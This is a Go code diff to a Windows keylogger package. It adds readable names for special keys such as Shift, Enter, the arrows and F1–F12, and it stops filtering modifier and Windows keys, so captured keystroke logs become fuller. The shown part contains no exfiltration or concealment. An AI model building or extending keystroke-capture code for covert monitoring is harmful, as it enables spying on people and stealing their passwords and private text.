@@ -39,6 +39,7 @@ type Key struct {
 	Empty   bool
 	Rune    rune
 	Keycode int
+	Name    string
 }
 
 // MouseButtonKeycodes list
@@ -49,6 +50,39 @@ var mouseButtonKeycodes = []int{
 	5,   // X1 mouse button (side button)
 	6,   // X2 mouse button (side button)
 	255, // Any additional mouse buttons or special mouse events
+}
+
+// SpecialKeyNames maps special keycodes to their descriptive names
+var specialKeyNames = map[int]string{
+	w32.VK_SHIFT:       "[Shift]",
+	w32.VK_CONTROL:     "[Ctrl]",
+	w32.VK_MENU:        "[Alt]",
+	w32.VK_RETURN:      "[Enter]",
+	w32.VK_BACK:        "[Backspace]",
+	w32.VK_TAB:         "[Tab]",
+	w32.VK_ESCAPE:      "[Esc]",
+	w32.VK_END:         "[End]",
+	w32.VK_HOME:        "[Home]",
+	w32.VK_LEFT:        "[Left]",
+	w32.VK_UP:          "[Up]",
+	w32.VK_RIGHT:       "[Right]",
+	w32.VK_DOWN:        "[Down]",
+	w32.VK_INSERT:      "[Insert]",
+	w32.VK_DELETE:      "[Delete]",
+	w32.VK_PRIOR:       "[Page Up]",
+	w32.VK_NEXT:        "[Page Down]",
+	w32.VK_F1:          "[F1]",
+	w32.VK_F2:          "[F2]",
+	w32.VK_F3:          "[F3]",
+	w32.VK_F4:          "[F4]",
+	w32.VK_F5:          "[F5]",
+	w32.VK_F6:          "[F6]",
+	w32.VK_F7:          "[F7]",
+	w32.VK_F8:          "[F8]",
+	w32.VK_F9:          "[F9]",
+	w32.VK_F10:         "[F10]",
+	w32.VK_F11:         "[F11]",
+	w32.VK_F12:         "[F12]",
 }
 
 // isMouseButton checks if the keycode corresponds to a mouse button
@@ -71,7 +105,7 @@ func (kl *Keylogger) GetKey() Key {
 
 		// Check if the most significant bit is set (key is down)
 		// And check if the key is not a non-char key (except for space, 0x20)
-		if keyState&(1<<15) != 0 && !isMouseButton(i) && (i < 160 || i > 165) && (i < 91 || i > 93) {
+		if keyState&(1<<15) != 0 && !isMouseButton(i) {
 			activeKey = i
 			break
 		}
@@ -90,9 +124,15 @@ func (kl *Keylogger) GetKey() Key {
 }
 
 // ParseKeycode returns the correct Key struct for a key taking into account the current keyboard settings
-// That struct contains the Rune for the key
+// That struct contains the Rune for the key and its descriptive name if it's a special key
 func (kl Keylogger) ParseKeycode(keyCode int, keyState uint16) Key {
 	key := Key{Empty: false, Keycode: keyCode}
+
+	// Check if the key is a special key
+	if name, found := specialKeyNames[keyCode]; found {
+		key.Name = name
+		return key
+	}
 
 	// Only one rune has to fit in
 	outBuf := make([]uint16, 1)
